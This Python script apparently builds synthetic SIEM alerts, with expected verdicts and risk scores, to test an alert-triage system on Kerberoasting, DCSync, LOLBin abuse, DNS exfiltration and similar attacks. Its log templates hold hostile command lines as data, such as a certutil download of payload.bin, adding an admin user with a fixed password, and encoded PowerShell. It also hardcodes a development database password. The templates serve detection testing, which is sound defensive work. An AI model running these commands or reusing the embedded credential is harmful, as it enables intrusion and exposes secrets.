#!/usr/bin/env python3
"""
ONE-TIME SETUP: Extract test alerts from the database and generate synthetic
alerts for task types with insufficient data. Outputs test_alerts.json.

Usage:
    python autoresearch/templates/setup_test_alerts.py \
        --db-url postgresql://zovark:zovark_dev_2026@localhost:5432/zovark

    If no database access, generates synthetic-only:
    python autoresearch/templates/setup_test_alerts.py --synthetic-only
"""

import json
import os
import sys
import random
import argparse

TARGET_TYPES = [
    "kerberoasting", "golden_ticket", "dcsync", "dll_sideloading",
    "lolbin_abuse", "process_injection", "wmi_lateral",
    "rdp_tunneling", "dns_exfiltration", "powershell_obfuscation",
]

ALERTS_PER_TYPE = 12  # 9 training + 3 holdout for attacks, 8+2 for benign

# --- Synthetic alert templates per task type ---
SYNTHETIC = {
    "kerberoasting": {
        "attack": {
            "title": "Kerberoasting - TGS Request for SPN",
            "rule_name": "KerberoastingAttempt",
            "log": "EventID=4769 TicketEncryptionType=0x17 ServiceName={spn} TargetUserName={user} ClientAddress={ip} Status=0x0",
            "spns": ["MSSQLSvc/db01:1433", "HTTP/web01", "CIFS/file01", "FTP/ftp01", "SIP/voip01", "LDAP/dc02", "SMTP/mail01", "DNS/ns01", "WSMAN/mgmt01", "HOST/app01", "MSSQLSvc/db02:1434", "HTTP/api01"],
            "min_risk": 75,
        },
        "benign": {
            "title": "Normal Kerberos Authentication",
            "rule_name": "KerberosAuth",
            "log": "EventID=4769 TicketEncryptionType=0x12 ServiceName=krbtgt/{domain} TargetUserName={user} ClientAddress={ip} Status=0x0",
            "max_risk": 30,
        },
    },
    "golden_ticket": {
        "attack": {
            "title": "Possible Golden Ticket - Forged TGT",
            "rule_name": "GoldenTicketDetection",
            "log": "EventID=4768 TicketEncryptionType=0x17 TargetUserName={user} ClientAddress={ip} ServiceName=krbtgt/{domain} TicketOptions=0x50800000 Lifetime=87600h",
            "min_risk": 80,
        },
        "benign": {
            "title": "Normal TGT Request",
            "rule_name": "KerberosAuth",
            "log": "EventID=4768 TicketEncryptionType=0x12 TargetUserName={user} ClientAddress={ip} ServiceName=krbtgt/{domain} Status=0x0",
            "max_risk": 25,
        },
    },
    "dcsync": {
        "attack": {
            "title": "DCSync - Directory Replication from Non-DC",
            "rule_name": "DCSyncAttempt",
            "log": "EventID=4662 ObjectType=domainDNS Properties=Replicating-Directory-Changes SubjectUserName={user} SubjectDomainName={domain} SourceAddress={ip}",
            "min_risk": 85,
        },
        "benign": {
            "title": "Normal AD Replication",
            "rule_name": "ADReplication",
            "log": "EventID=4662 ObjectType=domainDNS SubjectUserName=DC01$ SubjectDomainName={domain} SourceAddress={ip} Normal replication cycle",
            "max_risk": 20,
        },
    },
    "dll_sideloading": {
        "attack": {
            "title": "DLL Sideloading - Unsigned DLL in System Path",
            "rule_name": "DLLSideload",
            "log": "Process={proc} loaded unsigned DLL {dll} from {path} PID={pid} User={user} SourceAddress={ip}",
            "procs": ["explorer.exe", "svchost.exe", "rundll32.exe", "msiexec.exe"],
            "dlls": ["version.dll", "cryptsp.dll", "wbemcomn.dll", "dbghelp.dll"],
            "paths": ["C:\\Users\\Public", "C:\\Temp", "C:\\ProgramData\\Updates"],
            "min_risk": 70,
        },
        "benign": {
            "title": "Normal DLL Load",
            "rule_name": "ProcessDLLLoad",
            "log": "Process=svchost.exe loaded signed DLL kernel32.dll from C:\\Windows\\System32 PID=4 User=SYSTEM",
            "max_risk": 15,
        },
    },
    "lolbin_abuse": {
        "attack": {
            "title": "LOLBin Abuse - Download via Certutil",
            "rule_name": "LOLBinExecution",
            "log": "Process=certutil.exe CommandLine='certutil -urlcache -split -f http://{ip}/payload.bin C:\\Temp\\update.exe' User={user} PID={pid}",
            "min_risk": 80,
        },
        "benign": {
            "title": "Normal Certutil Usage",
            "rule_name": "CertificateOperation",
            "log": "Process=certutil.exe CommandLine='certutil -verify certificate.cer' User={user} Normal certificate verification",
            "max_risk": 20,
        },
    },
    "process_injection": {
        "attack": {
            "title": "Process Injection - CreateRemoteThread",
            "rule_name": "ProcessInjection",
            "log": "SourceProcess={sproc} TargetProcess={tproc} API=CreateRemoteThread TargetPID={pid} User={user} SourceAddress={ip}",
            "sprocs": ["powershell.exe", "cmd.exe", "unknown.exe", "svchost.exe"],
            "tprocs": ["lsass.exe", "explorer.exe", "winlogon.exe", "csrss.exe"],
            "min_risk": 85,
        },
        "benign": {
            "title": "Normal Thread Creation",
            "rule_name": "ThreadCreation",
            "log": "SourceProcess=services.exe TargetProcess=svchost.exe API=CreateThread Normal service startup",
            "max_risk": 15,
        },
    },
    "wmi_lateral": {
        "attack": {
            "title": "WMI Lateral Movement - Remote Process Creation",
            "rule_name": "WMILateral",
            "log": "WMI process create on remote host {host} CommandLine='{cmd}' User={user} SourceAddress={ip}",
            "hosts": ["WS-FIN-01", "SRV-DB-02", "DC-BACKUP", "WS-HR-05"],
            "cmds": ["powershell -enc JABz", "cmd /c whoami > C:\\temp\\out.txt", "net user admin Pass123 /add"],
            "min_risk": 80,
        },
        "benign": {
            "title": "Normal WMI Query",
            "rule_name": "WMIQuery",
            "log": "WMI query SELECT * FROM Win32_OperatingSystem on localhost User=SYSTEM Normal monitoring",
            "max_risk": 15,
        },
    },
    "rdp_tunneling": {
        "attack": {
            "title": "RDP Tunneling - Unusual Source Port",
            "rule_name": "RDPAnomaly",
            "log": "RDP connection from {ip}:{port} to {host}:3389 User={user} TunnelDetected=true SSHProcess=plink.exe",
            "ports": ["8443", "4443", "9999", "12345"],
            "min_risk": 75,
        },
        "benign": {
            "title": "Normal RDP Session",
            "rule_name": "RDPLogin",
            "log": "RDP connection from {ip} to {host}:3389 User={user} Status=Success NLA=true",
            "max_risk": 20,
        },
    },
    "dns_exfiltration": {
        "attack": {
            "title": "DNS Exfiltration - High Entropy Queries",
            "rule_name": "DNSExfil",
            "log": "DNS query {subdomain}.{domain} from {ip} QueryType=TXT ResponseSize=4096 Entropy=5.8 QueriesInWindow=847",
            "subdomains": ["aGVsbG8gd29ybGQ", "dGhpcyBpcyBkYXRh", "c2VjcmV0X2RhdGE", "ZXhmaWx0cmF0aW9u"],
            "domains": ["evil-cdn.net", "data-sync.io", "update-check.com"],
            "min_risk": 75,
        },
        "benign": {
            "title": "Normal DNS Query",
            "rule_name": "DNSLookup",
            "log": "DNS query www.{domain} from {ip} QueryType=A ResponseSize=64 Normal lookup",
            "max_risk": 15,
        },
    },
    "powershell_obfuscation": {
        "attack": {
            "title": "Obfuscated PowerShell Execution",
            "rule_name": "PowerShellObfuscation",
            "log": "Process=powershell.exe CommandLine='powershell -enc {encoded}' User={user} PID={pid} ParentProcess={parent} SourceAddress={ip}",
            "encoded": ["JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "SW52b2tlLUV4cHJlc3Npb24=", "SQBFAFgAIAAoAE4AZQB3AC0A"],
            "parents": ["cmd.exe", "explorer.exe", "winword.exe", "excel.exe"],
            "min_risk": 80,
        },
        "benign": {
            "title": "Normal PowerShell Script",
            "rule_name": "PowerShellExec",
            "log": "Process=powershell.exe CommandLine='Get-Process | Format-Table' User=admin Signed=true Normal admin script",
            "max_risk": 20,
        },
    },
}


def gen_ip():
    return f"{random.choice([10, 172, 192])}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def gen_user():
    return random.choice([
        "jsmith", "admin", "svc_sql", "svc_http", "backup_admin",
        "finance_user", "hr_analyst", "dev_ops", "contractor01", "it_support",
        "cfo_assistant", "intern_2026",
    ])


def gen_domain():
    return random.choice(["CORP.LOCAL", "INTERNAL.NET", "PROD.COMPANY.COM", "DEV.LOCAL"])


def generate_alerts(task_type: str) -> dict:
    """Generate attack + benign alerts for a task type."""
    spec = SYNTHETIC.get(task_type)
    if not spec:
        return {"attacks": [], "benign": []}

    attacks = []
    for i in range(ALERTS_PER_TYPE):
        ip = gen_ip()
        user = gen_user()
        a = spec["attack"]
        raw = a["log"].format(
            ip=ip, user=user, domain=gen_domain(),
            spn=random.choice(a.get("spns", ["SVC/host"])),
            proc=random.choice(a.get("procs", ["svchost.exe"])),
            dll=random.choice(a.get("dlls", ["version.dll"])),
            path=random.choice(a.get("paths", ["C:\\Temp"])),
            pid=random.randint(1000, 65000),
            sproc=random.choice(a.get("sprocs", ["cmd.exe"])),
            tproc=random.choice(a.get("tprocs", ["lsass.exe"])),
            host=random.choice(a.get("hosts", [f"WS-{random.randint(1, 50):03d}"])),
            cmd=random.choice(a.get("cmds", ["whoami"])),
            port=random.choice(a.get("ports", ["8443"])),
            subdomain=random.choice(a.get("subdomains", ["data"])),
            encoded=random.choice(a.get("encoded", ["SQBFAFgA"])),
            parent=random.choice(a.get("parents", ["cmd.exe"])),
        )
        attacks.append({
            "siem_event": {
                "title": a["title"],
                "source_ip": ip,
                "username": user,
                "hostname": f"WS-{random.randint(1, 99):03d}",
                "rule_name": a["rule_name"],
                "raw_log": raw,
            },
            "expected_verdict": "true_positive",
            "expected_min_risk": a["min_risk"],
            "expected_iocs": [ip, user],
        })

    benigns = []
    for i in range(ALERTS_PER_TYPE):
        ip = gen_ip()
        user = gen_user()
        b = spec["benign"]
        raw = b["log"].format(
            ip=ip, user=user, domain=gen_domain(),
            host=f"WS-{random.randint(1, 50):03d}",
            pid=random.randint(1000, 65000),
        )
        benigns.append({
            "siem_event": {
                "title": b["title"],
                "source_ip": ip,
                "username": user,
                "hostname": f"WS-{random.randint(1, 99):03d}",
                "rule_name": b["rule_name"],
                "raw_log": raw,
            },
            "expected_verdict": "benign",
            "expected_max_risk": b["max_risk"],
        })

    return {"attacks": attacks, "benign": benigns}


def extract_from_db(db_url: str) -> dict:
    """Pull real investigations from the database if available."""
    try:
        import psycopg2
    except ImportError:
        print("  psycopg2 not available, using synthetic-only")
        return {}

    try:
        conn = psycopg2.connect(db_url)
        cursor = conn.cursor()
        result = {}

        for tt in TARGET_TYPES:
            cursor.execute("""
                SELECT input->'siem_event', output->>'verdict',
                       (output->>'risk_score')::int, output->'iocs'
                FROM agent_tasks
                WHERE task_type LIKE %s AND status = 'completed'
                AND output->>'verdict' IN ('true_positive', 'suspicious')
                ORDER BY created_at DESC LIMIT %s
            """, (f"%{tt}%", ALERTS_PER_TYPE))

            attacks = []
            for siem, verdict, risk, iocs_raw in cursor.fetchall():
                se = json.loads(siem) if isinstance(siem, str) else siem
                ioc_vals = []
                if iocs_raw:
                    il = json.loads(iocs_raw) if isinstance(iocs_raw, str) else iocs_raw
                    ioc_vals = [i.get("value", "") if isinstance(i, dict) else str(i) for i in il][:5]
                attacks.append({
                    "siem_event": se,
                    "expected_verdict": "true_positive",
                    "expected_min_risk": max(70, risk - 10),
                    "expected_iocs": ioc_vals,
                })

            if attacks:
                result[tt] = {"attacks": attacks, "benign": []}
                print(f"  {tt}: {len(attacks)} real attacks from DB")

        conn.close()
        return result
    except Exception as e:
        print(f"  DB error: {e}, using synthetic-only")
        return {}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--db-url", default=os.getenv("DATABASE_URL",
        "postgresql://zovark:zovark_dev_2026@localhost:5432/zovark"))
    parser.add_argument("--synthetic-only", action="store_true")
    parser.add_argument("--output", default=os.path.join(
        os.path.dirname(__file__), "test_alerts.json"))
    args = parser.parse_args()

    print("Generating test alerts...\n")

    # Try DB first
    db_alerts = {} if args.synthetic_only else extract_from_db(args.db_url)

    # Generate synthetic for all types, merge with DB data
    all_alerts = {}
    for tt in TARGET_TYPES:
        synthetic = generate_alerts(tt)
        db_data = db_alerts.get(tt, {"attacks": [], "benign": []})

        attacks = db_data["attacks"][:ALERTS_PER_TYPE]
        remaining = ALERTS_PER_TYPE - len(attacks)
        if remaining > 0:
            attacks.extend(synthetic["attacks"][:remaining])

        benigns = db_data.get("benign", [])[:ALERTS_PER_TYPE]
        remaining_b = ALERTS_PER_TYPE - len(benigns)
        if remaining_b > 0:
            benigns.extend(synthetic["benign"][:remaining_b])

        all_alerts[tt] = {"attacks": attacks, "benign": benigns}
        print(f"  {tt}: {len(attacks)} attacks ({len(db_data['attacks'])} real + {len(attacks) - len(db_data['attacks'])} synthetic), {len(benigns)} benign")

    with open(args.output, "w") as f:
        json.dump(all_alerts, f, indent=2)

    print(f"\nSaved to {args.output}")
    print(f"Total: {len(all_alerts)} task types, {sum(len(v['attacks']) + len(v['benign']) for v in all_alerts.values())} alerts")


if __name__ == "__main__":
    main()
